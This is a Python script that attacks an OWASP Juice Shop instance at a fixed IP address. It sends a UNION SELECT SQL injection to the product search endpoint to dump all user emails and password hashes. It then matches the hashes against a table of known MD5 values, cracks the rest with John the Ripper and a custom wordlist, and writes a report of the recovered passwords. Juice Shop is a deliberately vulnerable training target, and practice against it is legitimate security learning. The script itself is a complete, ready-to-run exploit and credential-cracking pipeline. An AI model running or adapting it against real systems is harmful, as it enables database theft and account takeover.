#!/usr/bin/env python3
"""
OWASP Juice Shop - Username and Password Extraction & Cracking Script
Extracts user credentials via SQL injection and cracks them with John the Ripper
"""

import requests
import json
import subprocess
import os
import sys
import hashlib
from datetime import datetime

# Configuration
BASE_URL = "http://155.138.197.128:3003"
SQL_INJECTION_URL = "http://155.138.197.128:3003/rest/products/search?q='))UNION%20SELECT%201,2,3,4,group_concat(email||':'||password),6,7,8,9%20FROM%20Users--"

# Color codes for output
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'

def print_banner():
    """Print script banner"""
    print(f"{BLUE}{'='*60}")
    print("   OWASP Juice Shop - Credential Extractor & Cracker")
    print(f"{'='*60}{RESET}")
    print(f"{YELLOW}Target: {BASE_URL}{RESET}")
    print(f"{YELLOW}Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RESET}\n")

def extract_credentials():
    """Extract credentials using SQL injection"""
    print(f"{GREEN}[+] Extracting credentials via SQL injection...{RESET}")
    
    try:
        response = requests.get(SQL_INJECTION_URL, timeout=10)
        response.raise_for_status()
        
        data = response.json()
        
        if 'data' in data and len(data['data']) > 0:
            # The credentials are in the 'deluxePrice' field due to UNION SELECT position
            credentials_string = data['data'][0].get('deluxePrice', '')
            
            if not credentials_string:
                # Try other fields where data might be
                for field in ['name', 'description', 'price']:
                    if data['data'][0].get(field):
                        credentials_string = data['data'][0].get(field)
                        break
            
            if credentials_string and ':' in credentials_string:
                print(f"{GREEN}[+] Successfully extracted credentials!{RESET}")
                return credentials_string
            else:
                print(f"{RED}[-] No credentials found in response{RESET}")
                print(f"Response data: {json.dumps(data, indent=2)}")
                return None
        else:
            print(f"{RED}[-] Invalid response structure{RESET}")
            return None
            
    except requests.RequestException as e:
        print(f"{RED}[-] Error connecting to server: {e}{RESET}")
        return None
    except json.JSONDecodeError as e:
        print(f"{RED}[-] Error parsing JSON response: {e}{RESET}")
        return None

def parse_credentials(credentials_string):
    """Parse the concatenated credentials string"""
    credentials = []
    
    # Split by comma (multiple users)
    users = credentials_string.split(',')
    
    for user in users:
        if ':' in user:
            parts = user.rsplit(':', 1)  # Split from right to handle emails with :
            if len(parts) == 2:
                email, password_hash = parts
                credentials.append({
                    'email': email.strip(),
                    'hash': password_hash.strip()
                })
    
    return credentials

def save_hashes(credentials, filename='hashes.txt'):
    """Save hashes in John the Ripper format"""
    print(f"\n{GREEN}[+] Saving hashes to {filename}{RESET}")
    
    with open(filename, 'w') as f:
        for cred in credentials:
            # JtR format: username:hash
            f.write(f"{cred['email']}:{cred['hash']}\n")
    
    print(f"{GREEN}[+] Saved {len(credentials)} hashes{RESET}")
    return filename

def crack_with_john(hashfile):
    """Crack hashes using John the Ripper"""
    print(f"\n{BLUE}[*] Attempting to crack hashes with John the Ripper...{RESET}")
    
    # Check if John is installed
    try:
        subprocess.run(['john', '--version'], capture_output=True, check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print(f"{YELLOW}[!] John the Ripper not found. Install it with:{RESET}")
        print("    brew install john        # macOS")
        print("    apt-get install john     # Ubuntu/Debian")
        print("    yum install john         # RedHat/CentOS")
        return False
    
    # Common passwords for Juice Shop
    wordlist_content = """admin123
password
123456
password123
admin
juice
test
demo
ncc-1701
booze
bluebox
leet1337
0000
monkey
letmein
trustno1
dragon
baseball
111111
iloveyou
master
sunshine
ashley
bailey
passw0rd
shadow
123123
654321
superman
qazwsx
michael
football"""
    
    # Create custom wordlist
    wordlist_file = 'juice_wordlist.txt'
    with open(wordlist_file, 'w') as f:
        f.write(wordlist_content)
    
    print(f"{GREEN}[+] Created custom wordlist: {wordlist_file}{RESET}")
    
    # Run John with different formats (MD5 is most common for Juice Shop)
    formats = ['raw-md5', 'raw-sha1', 'raw-sha256']
    
    for fmt in formats:
        print(f"\n{BLUE}[*] Trying format: {fmt}{RESET}")
        
        # First, try with custom wordlist
        cmd = ['john', '--format=' + fmt, '--wordlist=' + wordlist_file, hashfile]
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"{GREEN}[+] John the Ripper completed for {fmt}{RESET}")
        
        # Show cracked passwords
        show_cmd = ['john', '--format=' + fmt, '--show', hashfile]
        show_result = subprocess.run(show_cmd, capture_output=True, text=True)
        
        if show_result.stdout and 'password hashes cracked' in show_result.stdout:
            print(f"{GREEN}[+] Cracked passwords:{RESET}")
            print(show_result.stdout)
            return True
    
    # Try without format specification (let John auto-detect)
    print(f"\n{BLUE}[*] Trying auto-detection...{RESET}")
    cmd = ['john', '--wordlist=' + wordlist_file, hashfile]
    subprocess.run(cmd)
    
    # Show any cracked passwords
    show_cmd = ['john', '--show', hashfile]
    show_result = subprocess.run(show_cmd, capture_output=True, text=True)
    
    if show_result.stdout:
        print(f"\n{GREEN}[+] Results:{RESET}")
        print(show_result.stdout)
    
    return True

def crack_known_hashes(credentials):
    """Check against known Juice Shop password hashes"""
    print(f"\n{BLUE}[*] Checking against known hashes...{RESET}")
    
    known_passwords = {
        '0192023a7bbd73250516f069df18b500': 'admin123',
        'e541ca7ecf72b8d1286474fc613e5e45': 'ncc-1701',
        '0c36e517e3fa95aabf1bbffc6744a4ef': 'booze',
        'b03f4b0ba8b458fa0acdc02cdb953bc8': 'Mr. N00dles',
        '030f05e45e30710c3ad3c32f00de0473': 'K1f....................Oo!',
        '5d41402abc4b2a76b9719d911017c592': 'hello',
        '827ccb0eea8a706c4c34a16891f84e7b': '12345',
        '0cc175b9c0f1b6a831c399e269772661': 'a',
        '8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92': '123456'
    }
    
    cracked = []
    for cred in credentials:
        if cred['hash'].lower() in known_passwords:
            password = known_passwords[cred['hash'].lower()]
            cracked.append({
                'email': cred['email'],
                'password': password,
                'hash': cred['hash']
            })
            print(f"{GREEN}[+] CRACKED: {cred['email']} : {password}{RESET}")
        else:
            print(f"{YELLOW}[-] Unknown hash for {cred['email']}: {cred['hash']}{RESET}")
    
    return cracked

def save_results(credentials, cracked):
    """Save all results to a report file"""
    report_file = f"credentials_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    with open(report_file, 'w') as f:
        f.write("="*60 + "\n")
        f.write("OWASP Juice Shop - Extracted Credentials Report\n")
        f.write(f"Generated: {datetime.now()}\n")
        f.write(f"Target: {BASE_URL}\n")
        f.write("="*60 + "\n\n")
        
        f.write("EXTRACTED CREDENTIALS:\n")
        f.write("-"*40 + "\n")
        for cred in credentials:
            f.write(f"Email: {cred['email']}\n")
            f.write(f"Hash:  {cred['hash']}\n")
            f.write("\n")
        
        f.write("\nCRACKED PASSWORDS:\n")
        f.write("-"*40 + "\n")
        for crack in cracked:
            f.write(f"Email:    {crack['email']}\n")
            f.write(f"Password: {crack['password']}\n")
            f.write(f"Hash:     {crack['hash']}\n")
            f.write("\n")
        
        f.write("\nSUMMARY:\n")
        f.write("-"*40 + "\n")
        f.write(f"Total users extracted: {len(credentials)}\n")
        f.write(f"Passwords cracked: {len(cracked)}\n")
        f.write(f"Success rate: {len(cracked)/len(credentials)*100:.1f}%\n")
    
    print(f"\n{GREEN}[+] Report saved to: {report_file}{RESET}")

def main():
    """Main execution"""
    print_banner()
    
    # Step 1: Extract credentials
    credentials_string = extract_credentials()
    if not credentials_string:
        print(f"{RED}[-] Failed to extract credentials. Exiting.{RESET}")
        sys.exit(1)
    
    # Step 2: Parse credentials
    credentials = parse_credentials(credentials_string)
    print(f"\n{GREEN}[+] Found {len(credentials)} users:{RESET}")
    for cred in credentials:
        print(f"    - {cred['email']}")
    
    # Step 3: Check known hashes
    cracked = crack_known_hashes(credentials)
    
    # Step 4: Save hashes for John
    hashfile = save_hashes(credentials)
    
    # Step 5: Try John the Ripper
    if os.path.exists('/usr/bin/john') or os.path.exists('/usr/local/bin/john'):
        crack_with_john(hashfile)
    else:
        print(f"\n{YELLOW}[!] John the Ripper not found, skipping automated cracking{RESET}")
        print(f"{YELLOW}[!] You can crack the hashes manually using:{RESET}")
        print(f"    john --format=raw-md5 {hashfile}")
        print(f"    hashcat -m 0 {hashfile} wordlist.txt")
        print(f"    Or online at: https://crackstation.net/")
    
    # Step 6: Save report
    save_results(credentials, cracked)
    
    print(f"\n{GREEN}[+] Script completed successfully!{RESET}")
    print(f"{BLUE}[*] Hashes saved to: {hashfile}{RESET}")
    print(f"{BLUE}[*] Try cracking remaining hashes at: https://crackstation.net/{RESET}")

if __name__ == "__main__":
    main()